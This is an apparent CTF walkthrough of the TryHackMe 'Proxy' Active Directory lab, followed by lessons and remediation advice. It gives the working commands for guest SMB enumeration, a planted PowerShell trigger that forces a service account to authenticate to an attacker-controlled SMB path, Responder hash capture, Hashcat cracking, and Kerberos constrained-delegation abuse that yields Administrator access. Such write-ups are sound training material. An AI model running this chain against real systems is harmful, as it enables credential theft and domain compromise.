# Proxy Challenge
*[Image: Banner]*

**Pathway:** *Jr Penetration Tester* | **Section:** *Active Directory Security Testing Basics* | **Challenge:** *[Proxy](https://tryhackme.com/room/proxychallenge)*

> [!IMPORTANT]
> **Spoiler warning:** This writeup contains part of exploitation chain, however no flag codes are shown in this writeup!
>
> **Please note:** The IP addresses shown in this writeup were allocated during the TryHackMe lab, with the attack performed from my own Kali Linux VM using OpenVPN connected to the TryHackMe VPN.
>
> **License:** Unless otherwise stated, all writeups and documentation in this repository are licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Any original scripts or code snippets are provided under the [MIT Licence](https://opensource.org/license/mit/).
> 
> This writeup uses several placeholders to avoid exposing lab-specific or sensitive information:
>
>: `<TARGET_IP>` - the IP address assigned to the target host when the TryHackMe machine is started.
>: `<TUN0_IP>` - the IP address assigned to my Kali Linux VM when connected to the TryHackMe VPN using OpenVPN.
>: `<REDACTED>` - information intentionally removed from the public writeup, such as flags, credentials, hashes or other challenge-sensitive values.
>
> This writeup reflects my own route through the challenge. Other learners may solve the room using different tools, commands or techniques. To preserve the integrity of the challenge and to act responsibly towards TryHackMe and the wider learning community, I choose what to redact from my public writeups unless I am asked by TryHackMe or another appropriate party to redact or remove additional material.

---

**Confirmed lab details used during testing:**

```text
Target IP: <TARGET_IP>
Kali tun0 IP: <TUN0_IP>
Attacker working directory: /tmp/VK
```

## About TryHackMe

This writeup was made possible by the hard work of the TryHackMe team and the wider cyber security community, who continue to create practical and engaging learning environments for aspiring security professionals.

[TryHackMe](https://tryhackme.com/) is an online cyber security training platform that provides hands-on labs covering penetration testing, networking, Active Directory, privilege escalation, web application security and defensive security. Its rooms give learners a controlled and authorised environment to practise realistic attack paths without targeting real-world systems.

This writeup documents the **Proxy** challenge from the **Jr Penetration Tester** pathway. The room focuses on Active Directory enumeration, service account abuse, forced authentication, NetNTLMv2 capture, Kerberos constrained delegation and administrative access through CIFS.

## Lab Summary

The objective of this challenge was to compromise the Active Directory environment and retrieve the Administrator flag from the Domain Controller.

The successful attack chain involved:

1. Enumerating the Domain Controller and identifying exposed Active Directory services.
2. Discovering guest access to SMB.
3. Finding a writable `IT-Shared` share.
4. Reviewing internal IT files that disclosed a service account workflow.
5. Abusing unsafe file inspection behaviour to force `svc.scanner` to authenticate to the attacker machine.
6. Capturing the `svc.scanner` NetNTLMv2 hash with Responder.
7. Cracking the captured hash with Hashcat.
8. Identifying constrained delegation rights on `svc.scanner`.
9. Requesting a CIFS service ticket while impersonating `Administrator`.
10. Using the Kerberos ticket to access `C$` on the Domain Controller and retrieve the Administrator flag.

No real-world systems were targeted. All testing was performed inside the TryHackMe lab environment.

## Tools Used

The main tools used were:

- `nmap` for initial service enumeration.
- `rustscan` for fast TCP port discovery.
- `netexec` / `nxc` for SMB and LDAP enumeration.
- `smbclient` for interacting with SMB shares.
- `Responder` for capturing NetNTLMv2 authentication attempts.
- `hashcat` for cracking the captured NetNTLMv2 hash.
- `ntpdate` for Kerberos time synchronisation.
- `impacket-getST` for S4U constrained delegation abuse.
- `impacket-smbclient` for Kerberos-authenticated SMB access.
- Standard Linux utilities such as `cat`, `grep`, `ls`, `wc` and `echo`.

## Initial Enumeration

### Port and Service Scan

The first step was to identify exposed services on the target.

```bash
nmap -Pn -sV -sC -oA proxy_initial <TARGET_IP>
```

The scan showed that the host was a Windows Domain Controller. The most important services were:

```text
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows NetBIOS
389/tcp   open  ldap          Microsoft Active Directory LDAP
445/tcp   open  microsoft-ds  SMB
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    Microsoft RPC over HTTP
636/tcp   open  ldaps
3268/tcp  open  ldap          Global Catalog
3269/tcp  open  ldaps         Global Catalog SSL
3389/tcp  open  ms-wbt-server RDP
9389/tcp  open  mc-nmf        .NET Message Framing
```

The scan also identified the domain and host information:

```text
Domain: ctf.local
NetBIOS domain: CTF
Computer name: DC01
DNS name: DC01.ctf.local
```

### Fast Port Confirmation

A secondary scan with `rustscan` confirmed the exposed services and identified additional high RPC ports.

```bash
rustscan -b 500 -a <TARGET_IP> --top -- -sC -sV -Pn
```

This confirmed that the target was running typical Active Directory services, including Kerberos, LDAP, SMB, RDP and RPC.

### SMB Guest Access

Guest authentication was then tested against SMB.

```bash
nxc smb <TARGET_IP> -u 'guest' -p '' --shares
```

The result showed that guest login was accepted and that the `IT-Shared` share was writable:

```text
Share       Permissions  Remark
-----       -----------  ------
IPC$        READ         Remote IPC
IT-Shared   READ,WRITE   IT Department Shared Resources
```

This was a major finding. Writable SMB shares on a Domain Controller are always worth investigating because they can expose internal documentation, scripts, credentials or file-processing workflows.

### RID Enumeration

The domain users were enumerated through RID brute forcing.

```bash
nxc smb <TARGET_IP> -u 'guest' -p '' --rid
```

Important accounts included:

```text
Administrator
Guest
krbtgt
DC01$
svc.scanner
svc.mssql
helpdesk.bob
it.admin
```

The usernames were saved into a local file for later reference.

```text
guest
Administrator
krbtgt
DC01$
svc.scanner
svc.mssql
helpdesk.bob
it.admin
```

## Exploits

### Reviewing the Writable IT Share

The writable share was accessed with `smbclient`.

```bash
smbclient '//<TARGET_IP>/IT-Shared' -U 'guest%'
```

The share contained three useful files:

```text
IT-Credentials-Backup.txt
IT-Onboarding-Checklist.txt
IT-Portal.html
```

They were downloaded locally for review.

```text
get IT-Credentials-Backup.txt
get IT-Onboarding-Checklist.txt
get IT-Portal.html
```

### Credentials Backup File

The credentials backup file contained old credentials for disabled users:

```text
helpdesk.bob  :  <REDACTED>
it.admin      :  <REDACTED>
```

These credentials were useful context, but the file stated that the accounts were disabled. The more important clue came from the onboarding checklist.

### Service Account Workflow Discovery

The onboarding checklist described two automated service accounts:

```text
File Scanner (svc.scanner)
  Runs every 2 minutes.
  Enumerates IT-Shared for new files to process.
  Uses Shell enumeration to inspect file metadata and icons.

Database Backup (svc.mssql)
  Handles nightly MSSQL backups.
  Member of Backup Operators.
```

The `IT-Portal.html` file also showed that the IT portal was logged in as `svc.scanner`.

```html
Logged in as: svc.scanner
```

This gave the intended exploitation path. The share was writable, and a service account periodically inspected uploaded files. If the scanner loaded file icons or metadata through Windows shell enumeration, it could be coerced into authenticating to an attacker-controlled SMB listener.

### Capturing NetNTLMv2 with Responder

Responder was started on the TryHackMe VPN interface.

```bash
responder -I tun0
```

Expected listener state:

```text
[+] Listening for events...
```

A PowerShell trigger file was then created locally. The purpose was to make the scanner access a fake SMB path hosted on the attacker machine.

```bash
cat > Elicit.ps1 <<'EOF'
Get-ChildItem \\<TUN0_IP>\icons\
EOF
```

The trigger file was uploaded to the writable share.

```bash
smbclient '//<TARGET_IP>/IT-Shared' -U 'guest%' -c 'put Elicit.ps1'
```

After the scanner processed the file, Responder captured an authentication attempt from the Domain Controller.

```text
[SMB] NTLMv2-SSP Client   : <TARGET_IP>
[SMB] NTLMv2-SSP Username : CTF\svc.scanner
[SMB] NTLMv2-SSP Hash     : svc.scanner::CTF:<REDACTED_HASH>
```

The captured hash was saved from the Responder logs rather than copied manually from the terminal. This reduced the chance of formatting mistakes.

```bash
grep -i '^svc.scanner::CTF:' \
  /usr/share/responder/logs/SMB-NTLMv2-SSP-<TARGET_IP>.txt \
  | tail -n 1 > svc.scanner.hash
```

### Cracking the Service Account Hash

The captured NetNTLMv2 hash was cracked with Hashcat using mode `5600`.

```bash
hashcat -m 5600 svc.scanner.hash /usr/share/wordlists/rockyou.txt --force
```

The cracked credential was:

```text
CTF\svc.scanner : <REDACTED>
```

For the public writeup, the password has been redacted.

### Validating the Credential

The credential was tested against SMB.

```bash
nxc smb <TARGET_IP> -d ctf.local -u 'svc.scanner' -p '<REDACTED>'
```

The login was valid:

```text
[+] ctf.local\svc.scanner:<REDACTED>
```

WinRM was also tested, but the account did not have remote management access.

```bash
nxc winrm <TARGET_IP> -d ctf.local -u 'svc.scanner' -p '<REDACTED>'
```

The result showed that this was not a direct shell path:

```text
[-] ctf.local\svc.scanner:<REDACTED>
```

### Preparing Name Resolution

Kerberos and LDAP tooling rely heavily on correct hostname resolution. The Domain Controller was added to `/etc/hosts`.

```bash
grep -q '<TARGET_IP>.*dc01.ctf.local' /etc/hosts || \
  echo '<TARGET_IP> dc01.ctf.local dc01 ctf.local' >> /etc/hosts
```

The expected entry was:

```text
<TARGET_IP> dc01.ctf.local dc01 ctf.local
```

> [!TIP]
> When using your own Kali VM, the `/etc/hosts` file is especially important in these TryHackMe web challenges. Many rooms rely on hostname-based routing, virtual hosts, cookies, redirects or application logic that will not behave correctly if the hostname is missing. Over time, `/etc/hosts` can become cluttered with old lab entries, so it is advantageous to keep it clear, tidy and focused on the challenge currently being worked on. A messy hosts file is basically DNS spaghetti: technically edible, but nobody sensible wants it.

### BloodHound Collection

BloodHound data was collected using the `svc.scanner` credential.

```bash
nxc ldap <TARGET_IP> \
  -d ctf.local \
  -u 'svc.scanner' \
  -p '<REDACTED>' \
  --bloodhound \
  --collection All \
  --dns-server <TARGET_IP>
```

The collection completed successfully and produced a BloodHound archive:

```text
/root/.nxc/logs/DC01_<TARGET_IP>_2026-07-08_175202_bloodhound.zip
```

### Finding Delegation Rights

Direct LDAP enumeration was then used to identify delegation settings.

```bash
nxc ldap <TARGET_IP> \
  -d ctf.local \
  -u 'svc.scanner' \
  -p '<REDACTED>' \
  --find-delegation
```

This revealed the critical misconfiguration:

```text
AccountName  AccountType  DelegationType                       DelegationRightsTo
-----------  -----------  ----------------------------------   ------------------------------
svc.scanner  Person       Constrained w/ Protocol Transition   cifs/DC01, cifs/DC01.ctf.local
```

This meant `svc.scanner` could perform protocol transition and obtain a service ticket to CIFS on the Domain Controller while impersonating another user.

### Kerberos Time Synchronisation

Kerberos is sensitive to clock skew, so Kali was synchronised with the Domain Controller.

```bash
ntpdate -u <TARGET_IP>
```

The time sync succeeded.

### Requesting a CIFS Ticket as Administrator

The next step was to abuse constrained delegation with Impacket.

```bash
impacket-getST \
  -spn cifs/DC01.ctf.local \
  -impersonate Administrator \
  -dc-ip <TARGET_IP> \
  'ctf.local/svc.scanner:<REDACTED>'
```

This created a Kerberos credential cache file:

```text
Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

The ticket cache was exported into the current shell.

```bash
export KRB5CCNAME=/tmp/VK/Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```

### Accessing the Domain Controller as Administrator

The Administrator CIFS ticket was used with `impacket-smbclient`.

```bash
impacket-smbclient -k -no-pass dc01.ctf.local
```

Inside the SMB prompt, the `C$` administrative share was selected.

```text
use C$
```

The Administrator desktop was then accessed.

```text
cd Users\Administrator\Desktop
ls
```

The desktop contained the challenge flag file:

```text
flag.txt
```

The file was read through SMB:

```text
cat flag.txt
```

The flag value has been redacted from this public writeup.

```text
THM{....}
```

## Full Attack Chain Recap

### 1. The attack began with Active Directory service enumeration.

The target was identified as a Windows Server 2019 Domain Controller named `DC01` in the `ctf.local` domain. Initial scanning showed common Active Directory services including DNS, Kerberos, LDAP, SMB, LDAPS, Global Catalog, RPC and RDP.

### 2. Guest SMB access exposed a writable shared folder.

SMB enumeration confirmed that the `guest` account could authenticate with a blank password. The `IT-Shared` share allowed both read and write access, which made it an important target for further inspection.

The share contained IT-related files including a credentials backup, an onboarding checklist and an internal portal page. The archived credentials were no longer useful directly because the listed accounts had been disabled, but the supporting files revealed the presence of active service accounts.

### 3. The IT onboarding information revealed unsafe service account behaviour.

The onboarding checklist stated that `svc.scanner` ran every two minutes and enumerated files in `IT-Shared`. It also noted that the scanner used shell enumeration to inspect file metadata and icons.

This was the key operational weakness. Because `guest` could write files into the same share that `svc.scanner` processed, it was possible to plant files designed to make the service account authenticate back to the attacker machine.

### 4. Responder captured the `svc.scanner` NetNTLMv2 challenge-response.

Responder was started on the Kali `tun0` interface. Several trigger files were tested in the writable share, including shortcut-style and PowerShell-based files that referenced an attacker-controlled SMB path.

When the scanner processed the malicious file, the Domain Controller connected back to the attacker machine and attempted SMB authentication. Responder captured a NetNTLMv2 challenge-response for `CTF\svc.scanner`.

The captured hash was then extracted from the Responder log and cracked offline with Hashcat using NetNTLMv2 mode. The recovered password provided valid domain credentials for `svc.scanner`.

### 5. LDAP enumeration revealed constrained delegation with protocol transition.

The recovered `svc.scanner` credentials were valid over SMB, but did not provide direct WinRM access. LDAP enumeration was therefore used to inspect Active Directory delegation settings.

The important finding was that `svc.scanner` had constrained delegation with protocol transition configured for CIFS on the Domain Controller:

    cifs/DC01
    cifs/DC01.ctf.local

This meant the account could request a CIFS service ticket to the Domain Controller while impersonating another user, including `Administrator`.

### 6. Kerberos S4U abuse produced Administrator-level CIFS access.

After synchronising the Kali clock with the Domain Controller, `impacket-getST` was used to request a CIFS service ticket for `DC01.ctf.local` while impersonating `Administrator`.

The resulting Kerberos cache file was exported through `KRB5CCNAME`, allowing Impacket tools to authenticate to SMB using the delegated Administrator ticket rather than a password.

Using `impacket-smbclient` with Kerberos authentication, the `C$` administrative share was accessed. From there, the Administrator desktop was browsed and the final flag file was read. The flag value has been intentionally redacted from this public writeup.

## Key Lessons

This challenge demonstrated several common Active Directory security weaknesses:

  * Anonymous or Guest Access Can Still Be Dangerous: Even without privileged credentials, the `guest` account had enough access to enumerate SMB shares and write to `IT-Shared`. A low-privilege write permission became the starting point for compromising a domain service account.

  * Shared Folders Need Careful Permission Management: Writable shares used by automated services are high-risk. If untrusted users can place files into a folder that a service account later processes, the share can become an authentication coercion or code execution pathway.

  * Service Account Behaviour Can Leak Credentials: The `svc.scanner` account inspected files placed in `IT-Shared`. Because shell-based metadata and icon inspection can trigger outbound SMB authentication, the scanner’s behaviour exposed the account to NetNTLMv2 capture.

  * NetNTLMv2 Capture Is Still Operationally Relevant: Captured challenge-response material is not the plaintext password, but weak or predictable service account passwords can still be cracked offline. Once cracked, those credentials can be reused for LDAP, SMB and Kerberos-based enumeration.

  * BloodHound-Style Enumeration Is Essential in Active Directory Labs: The recovered service account did not provide a direct shell, but LDAP enumeration revealed the real privilege escalation path. Active Directory compromise often depends on relationships and permissions rather than obvious local administrator access.

  * Constrained Delegation with Protocol Transition Is Powerful: `svc.scanner` was allowed to delegate to CIFS on the Domain Controller. With protocol transition enabled, this allowed the attacker to request a service ticket as `Administrator` and access the DC’s administrative file share.

  * Kerberos Time Synchronisation Matters: Kerberos authentication is sensitive to clock skew. Synchronising the Kali VM with the Domain Controller was necessary before using the delegated Kerberos ticket reliably.

## Remediation Notes

The weaknesses in this lab could be mitigated by:

  * Remove Guest and Anonymous Share Access: The `guest` account should not have access to internal administrative shares. Where guest access is unavoidable, it should be read-only, tightly scoped and monitored.

  * Restrict Write Access on Service-Processed Folders: Users should not be able to write into directories processed by privileged or semi-privileged service accounts. If a service must process user-supplied files, it should do so from a controlled staging area with strict validation and isolation.

  * Avoid Shell-Based Processing of Untrusted Files: Automated services should not use Windows shell enumeration, icon loading or metadata handlers against untrusted content. These behaviours can trigger outbound authentication and may expose service account credentials.

  * Disable Unnecessary NTLM Authentication: NTLM should be reduced or disabled where possible, especially for service accounts. Organisations should consider enforcing SMB signing, restricting outbound NTLM and monitoring for unexpected NetNTLMv2 authentication attempts.

  * Use Strong, Managed Service Account Passwords: Service accounts should use long, randomly generated passwords or group Managed Service Accounts where appropriate. Passwords should not be human-readable, reused, predictable or crackable with common wordlists.

  * Audit Delegation Settings Regularly: Constrained delegation and protocol transition should be reviewed frequently. Accounts with `msDS-AllowedToDelegateTo` configured should be treated as sensitive, especially where delegation targets include CIFS, LDAP, HOST or other high-impact services on Domain Controllers.

  * Apply Least Privilege to Service Accounts: Service accounts should only have the permissions needed for their specific function. A file-scanning account should not be able to delegate to CIFS on a Domain Controller unless there is a clear, documented and reviewed business requirement.

  * Monitor for Kerberos S4U Abuse: Security monitoring should alert on unusual S4U2Self and S4U2Proxy activity, especially when a non-administrative service account requests tickets impersonating privileged users such as `Administrator`.

  * Segment and Control Outbound SMB: Servers should not be able to initiate arbitrary SMB connections to workstation or VPN client addresses. Egress filtering and host firewall rules can reduce the chance of successful credential coercion.

## Disclaimer

This writeup is intended solely for education, training and documentation of an authorised TryHackMe lab.

All tools, commands, payloads and post-exploitation techniques described here were used within a controlled environment provided by TryHackMe. Permission to interact with the target was granted by the platform owner and operator as part of the room.

The tools and methods documented in this walkthrough represent one successful approach. They are not the only possible techniques, and alternative tools or workflows may produce the same result.

Never test, scan, exploit or access a system without clear and explicit authorisation from its owner.

---
[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoffee.com/v4l1k4hn)  

**Powered on ☕ made with ❤️ by [V4L1K4HN](https://tryhackme.com/p/V4L1K4HN)**  
⭐ If this project is useful, consider starring it on GitHub.
